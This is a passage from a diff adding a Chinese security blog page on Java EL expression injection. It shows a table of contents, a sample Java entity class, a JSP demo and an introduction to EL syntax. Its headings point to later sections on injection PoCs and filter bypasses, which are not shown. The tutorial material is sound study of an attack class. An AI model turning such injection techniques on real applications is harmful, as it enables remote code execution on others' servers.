@@ -1,0 +1,1034 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8" />
+    <title>EL表达式注入 | 雲流のLowest World</title>
+    <meta name="author" content="C1oudfL0w0" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
+    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
+    <!-- cdn挂掉的时候要可以引用本地 -->
+<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
+<script src="/blog/js/vue.global.prod.min.js"></script>
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />
+
+
+<link rel="stylesheet" href="/blog/css/all.min.css" />
+<link rel="stylesheet" href="/blog/css/fonts.min.css" />
+<link rel="stylesheet" href="/blog/css/search.css" />
+<script> const mixins = {}; </script>
+
+<!-- 引入jQuery-->
+<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
+<script src="/blog/js/jquery.min.js"></script>
+
+<!--改成了prismjs高亮-->
+
+<script src="/blog/js/lib/prism.js"></script>
+<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />
+
+
+
+<script src="/blog/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+
+<script src="/blog/js/lib/home.js"></script>
+
+<link rel="stylesheet" href="/blog/css/main.css" />
+<!-- 引入不蒜子-->
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<!-- 引入clipboard -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
+</head>
+
+<body>
+    <!--flag{never_g0nna g1ve_you up}-->
+
+    <!-- 页面点击特效 -->
+    <script type="text/javascript" src="/blog/js/love-click.js"></script>
+
+    <!-- 浏览器标题 -->
+    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>
+
+    <!-- 动态背景 -->
+    
+
+    <!--文章目录-->
+    
+    <div id="toc" class="toc-article">
+    <h3><i class="fas fa-stream"></i>  目录</h3>
+      <div class="toc-title"></div>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8A%A8%E6%80%81jsp-Demo"><span class="toc-number">2.</span> <span class="toc-text">动态jsp Demo</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#EL"><span class="toc-number">3.</span> <span class="toc-text">EL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-number">3.1.</span> <span class="toc-text">基本语法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8E-%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="toc-number">3.1.1.</span> <span class="toc-text">[ ]与.运算符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#empty"><span class="toc-number">3.1.2.</span> <span class="toc-text">empty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9D%A1%E4%BB%B6%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">3.1.3.</span> <span class="toc-text">条件表达式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F"><span class="toc-number">3.1.4.</span> <span class="toc-text">变量</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Demo"><span class="toc-number">3.1.4.1.</span> <span class="toc-text">Demo</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6"><span class="toc-number">3.1.5.</span> <span class="toc-text">操作符</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E5%BC%8F%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.2.</span> <span class="toc-text">隐式对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EL%E4%B8%AD%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-number">3.3.</span> <span class="toc-text">EL中的函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B0%83%E7%94%A8Java%E6%96%B9%E6%B3%95"><span class="toc-number">3.4.</span> <span class="toc-text">调用Java方法</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8-x2F-%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">4.</span> <span class="toc-text">启动&#x2F;禁用EL表达式</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%A8%E5%B1%80%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">4.1.</span> <span class="toc-text">全局禁用EL表达式</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8D%95%E4%B8%AA%E6%96%87%E4%BB%B6%E7%A6%81%E7%94%A8EL%E8%A1%A8%E8%BE%BE%E5%BC%8F"><span class="toc-number">4.2.</span> <span class="toc-text">单个文件禁用EL表达式</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E7%94%A8poc"><span class="toc-number">5.1.</span> <span class="toc-text">通用poc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%9C%BA%E6%99%AF"><span class="toc-number">5.2.</span> <span class="toc-text">漏洞场景</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2011-2730"><span class="toc-number">5.3.</span> <span class="toc-text">CVE-2011-2730</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JUEL"><span class="toc-number">5.3.1.</span> <span class="toc-text">JUEL</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">5.4.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="toc-number">5.4.1.</span> <span class="toc-text">利用反射机制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ScriptEngine%E8%B0%83%E7%94%A8JS%E5%BC%95%E6%93%8E"><span class="toc-number">5.4.2.</span> <span class="toc-text">利用ScriptEngine调用JS引擎</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8Unicode%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">5.4.3.</span> <span class="toc-text">利用Unicode编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E5%85%AB%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-number">5.4.4.</span> <span class="toc-text">利用八进制绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">6.</span> <span class="toc-text">防御</span></a></li></ol>
+    </div>
+  
+
+    <!--返回顶部-->
+    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
+        <a title="返回顶部">↑</a>
+    </div>
+    <script src="/blog/js/totop.js"></script>
+
+    <div id="layout">
+        
+            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
+            
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>第一次加载文章图片可能会花费较长时间</p>
+                    <p>要不挂个梯子试试？（x</p>
+                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
+                    <img src="/blog/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <transition name="into">
+            <div id="main" v-show="!loading">
+                <nav id="menu" ref="menu">
+    <div class="desktop-menu">
+        <a class="title" href="/blog/">
+            <span>雲流のLOWEST WORLD</span>
+        </a>
+        
+        <a href="/blog/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/blog/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/blog/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/blog/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/blog/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+        <a href="/blog/links">
+            <i class="fa-solid fa-link fa-fw"></i>
+            <span>&ensp;Links</span>
+        </a>
+        
+        <a href="/blog/search">
+            <i class="fa-solid fa-search fa-fw"></i>
+            <span>&ensp;Search</span>
+        </a>
+        
+    </div>
+    <div id="mobile-menu">
+        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
+        <div class="title" @click="showMenu = !showMenu">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;雲流のLOWEST WORLD</span>
+        </div>
+        <transition name="slide">
+        <div class="items" v-show="showMenu">
+            
+            <a href="/blog/">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-house fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                </div>
+            </a>
+            
+            <a href="/blog/about">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-id-card fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                </div>
+            </a>
+            
+            <a href="/blog/archives">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-box-archive fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                </div>
+            </a>
+            
+            <a href="/blog/categories">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                </div>
+            </a>
+            
+            <a href="/blog/tags">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-tags fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                </div>
+            </a>
+            
+            <a href="/blog/links">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-link fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
+                </div>
+            </a>
+            
+            <a href="/blog/search">
+                <div class="item">
+                    <div style="min-width: 20px; max-width: 50px; width: 10%">
+                        <i class="fa-solid fa-search fa-fw"></i>
+                    </div>
+                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
+                </div>
+            </a>
+            
+        </div>
+        </transition>
+    </div>
+</nav>
+
+                <div class="article">
+    <div>
+        <h1>EL表达式注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2024/2/18
+        </span>
+        
+        <span class="category">
+            <a href="/blog/categories/Web/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                Web
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/blog/tags/Java/" style="color: #ffa2c4">Java</a>
+            </span>
+            
+        </span>
+        
+        <!--文章字数统计-->
+        
+            
+<div style="margin-top:10px;">
+    <span class="post-time">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-keyboard-o"></i>
+        <span class="post-meta-item-text">  字数统计: </span>
+        <!-- 安装插件npm install hexo-wordcount --save -->
+        <span class="post-count">5k字</span>
+      </span>
+    </span>
+
+    <span class="post-time">
+      &nbsp; | &nbsp;
+      <span class="post-meta-item-icon">
+        <i class="fa fa-hourglass-half"></i>
+        <span class="post-meta-item-text">  阅读时长: </span>
+        <span class="post-count">24分</span>
+      </span>
+    </span>
+    
+    <!--不蒜子统计访问数-->
+    <span id="busuanzi_container_page_pv">
+    &nbsp; | &nbsp;
+    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
+    </span>
+</div>
+
+          
+    </div>
+    
+    <div class="content" v-pre>
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>参考：</p>
+<p><a target="_blank" rel="noopener" href="http://www.mi1k7ea.com/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">http://www.mi1k7ea.com/2020/04/26/%E6%B5%85%E6%9E%90EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E</a></p>
+<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">https://drun1baby.top/2022/09/23/Java-%E4%B9%8B-EL-%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/</a></p>
+<span id="more"></span>
+
+<hr>
+<h1 id="动态jsp-Demo"><a href="#动态jsp-Demo" class="headerlink" title="动态jsp Demo"></a>动态jsp Demo</h1><p>准备一个实体类</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example<span class="token punctuation">.</span>learnservlet<span class="token punctuation">.</span>pojo</span><span class="token punctuation">;</span>
+
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Band</span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">private</span> <span class="token class-name">Integer</span> id<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> bandName<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> <span class="token class-name">AnimationName</span><span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">Integer</span> ordered<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">String</span> description<span class="token punctuation">;</span>
+    <span class="token keyword">private</span> <span class="token class-name">Integer</span> status<span class="token punctuation">;</span>
+
+
+    <span class="token keyword">public</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">,</span> <span class="token class-name">String</span> bandName<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name">AnimationName</span><span class="token punctuation">,</span> <span class="token class-name">String</span> description<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>bandName <span class="token operator">=</span> bandName<span class="token punctuation">;</span>
+        <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>AnimationName</span> <span class="token operator">=</span> <span class="token class-name">AnimationName</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Band</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">,</span> <span class="token class-name">String</span> bandName<span class="token punctuation">,</span> <span class="token class-name">String</span> <span class="token class-name">AnimationName</span><span class="token punctuation">,</span> <span class="token class-name">Integer</span> ordered<span class="token punctuation">,</span> <span class="token class-name">String</span> description<span class="token punctuation">,</span> <span class="token class-name">Integer</span> status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>bandName <span class="token operator">=</span> bandName<span class="token punctuation">;</span>
+        <span class="token class-name"><span class="token namespace">this<span class="token punctuation">.</span></span>AnimationName</span> <span class="token operator">=</span> <span class="token class-name">AnimationName</span><span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>ordered <span class="token operator">=</span> ordered<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">=</span> status<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> id<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> id<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getBandName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> bandName<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBandName</span><span class="token punctuation">(</span><span class="token class-name">String</span> bandName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>bandName <span class="token operator">=</span> bandName<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAnimationName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token class-name">AnimationName</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAnimationName</span><span class="token punctuation">(</span><span class="token class-name">String</span> animationName<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token class-name">AnimationName</span> <span class="token operator">=</span> animationName<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getOrdered</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> ordered<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOrdered</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> ordered<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>ordered <span class="token operator">=</span> ordered<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getDescription</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> description<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setDescription</span><span class="token punctuation">(</span><span class="token class-name">String</span> description<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>description <span class="token operator">=</span> description<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Integer</span> <span class="token function">getStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> status<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setStatus</span><span class="token punctuation">(</span><span class="token class-name">Integer</span> status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">this</span><span class="token punctuation">.</span>status <span class="token operator">=</span> status<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+
+    <span class="token annotation punctuation">@Override</span>
+    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">return</span> <span class="token string">"Band&#123;"</span> <span class="token operator">+</span>
+                <span class="token string">"id="</span> <span class="token operator">+</span> id <span class="token operator">+</span>
+                <span class="token string">", bandName='"</span> <span class="token operator">+</span> bandName <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
+                <span class="token string">", AnimationName='"</span> <span class="token operator">+</span> <span class="token class-name">AnimationName</span> <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
+                <span class="token string">", ordered="</span> <span class="token operator">+</span> ordered <span class="token operator">+</span>
+                <span class="token string">", description='"</span> <span class="token operator">+</span> description <span class="token operator">+</span> <span class="token char">'\''</span> <span class="token operator">+</span>
+                <span class="token string">", status="</span> <span class="token operator">+</span> status <span class="token operator">+</span>
+                <span class="token char">'&#125;'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>然后准备动态的jsp代码band.jsp</p>
+<pre class="line-numbers language-jsp" data-language="jsp"><code class="language-jsp">&lt;%@ page import&#x3D;&quot;com.example.learnservlet.pojo.Band&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;java.util.List&quot; %&gt;
+&lt;%@ page import&#x3D;&quot;java.util.ArrayList&quot; %&gt;
+&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;
+
+&lt;%
+    &#x2F;&#x2F; 查询数据库
+    List&lt;Band&gt; brands &#x3D; new ArrayList&lt;Band&gt;();
+    brands.add(new Band(1,&quot;结束乐队&quot;,&quot;孤独摇滚&quot;,100,&quot;Guitar Hero&quot;,1));
+    brands.add(new Band(2,&quot;MyGO!!!!!&quot;,&quot;BanGDream It&#39;s MyGO!!!!!&quot;,200,&quot;为什么要演奏春日影！&quot;,1));
+    brands.add(new Band(3,&quot;有刺无刺&quot;,&quot;Girls Band Cry&quot;,1000,&quot;凸😄凸&quot;,0));
+
+%&gt;
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang&#x3D;&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;
+    &lt;title&gt;看少女乐队看的&lt;&#x2F;title&gt;
+&lt;&#x2F;head&gt;
+&lt;body&gt;
+&lt;input type&#x3D;&quot;button&quot; value&#x3D;&quot;新增&quot;&gt;&lt;br&gt;
+&lt;hr&gt;
+&lt;table border&#x3D;&quot;1&quot; cellspacing&#x3D;&quot;0&quot; width&#x3D;&quot;800&quot;&gt;
+    &lt;tr&gt;
+        &lt;th&gt;序号&lt;&#x2F;th&gt;
+        &lt;th&gt;乐队名称&lt;&#x2F;th&gt;
+        &lt;th&gt;动画名称&lt;&#x2F;th&gt;
+        &lt;th&gt;排序&lt;&#x2F;th&gt;
+        &lt;th&gt;介绍&lt;&#x2F;th&gt;
+        &lt;th&gt;状态&lt;&#x2F;th&gt;
+        &lt;th&gt;操作&lt;&#x2F;th&gt;
+    &lt;&#x2F;tr&gt;
+    &lt;%
+        for (int i &#x3D; 0; i &lt; brands.size(); i++) &#123;
+            Band brand &#x3D; brands.get(i);
+    %&gt;
+    &lt;tr align&#x3D;&quot;center&quot;&gt;
+        &lt;td&gt;&lt;%&#x3D;brand.getId()%&gt;&lt;&#x2F;td&gt;
+        &lt;td&gt;&lt;%&#x3D;brand.getBandName()%&gt;&lt;&#x2F;td&gt;
+        &lt;td&gt;&lt;%&#x3D;brand.getAnimationName()%&gt;&lt;&#x2F;td&gt;
+        &lt;td&gt;&lt;%&#x3D;brand.getOrdered()%&gt;&lt;&#x2F;td&gt;
+        &lt;td&gt;&lt;%&#x3D;brand.getDescription()%&gt;&lt;&#x2F;td&gt;
+        &lt;td&gt;&lt;%&#x3D;brand.getStatus() &#x3D;&#x3D; 1 ? &quot;完结&quot;:&quot;在追&quot;%&gt;&lt;&#x2F;td&gt;
+        &lt;td&gt;&lt;a href&#x3D;&quot;#&quot;&gt;修改&lt;&#x2F;a&gt; &lt;a href&#x3D;&quot;#&quot;&gt;删除&lt;&#x2F;a&gt;&lt;&#x2F;td&gt;
+    &lt;&#x2F;tr&gt;
+    &lt;%
+        &#125;
+    %&gt;
+&lt;&#x2F;table&gt;
+&lt;&#x2F;body&gt;
+&lt;&#x2F;html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>以上就是动态jsp的实现</p>
+<p><img src="/blog/2024/02/18/EL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/image-20240716190934155.png" alt="image-20240716190934155"></p>
+<hr>
+<h1 id="EL"><a href="#EL" class="headerlink" title="EL"></a>EL</h1><p>可以理解为简化的 Jsp</p>
+<p>EL（Expression Language）功能：</p>
+<ul>
+<li>获取数据：EL表达式主要用于替换 JSP 页面中的脚本表达式，以从各种类型的Web域中检索Java对象、获取数据（某个Web域中的对象，访问JavaBean的属性、访问List集合、访问Map集合、访问数组）</li>
+<li>执行运算：利用EL表达式可以在JSP页面中执行一些基本的关系运算、逻辑运算和算术运算，以在JSP页面中完成一些简单的逻辑运算，例如<code>$&#123;user==null&#125;</code></li>
+<li><strong>获取Web开发常用对象</strong>：EL表达式定义了一些隐式对象，利用这些隐式对象，Web开发人员可以很轻松获得对Web常用对象的引用，从而获得这些对象中的数据</li>
+<li><strong>调用Java方法</strong>：EL表达式允许用户开发自定义EL函数，以在JSP页面中通过EL表达式调用Java类的方法</li>
+</ul>
+<p>用法：</p>
+<p>先通过 page 标签设置不忽略 EI 表达式</p>
+<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> isELIgnored<span class="token operator">=</span><span class="token string">"false"</span> <span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
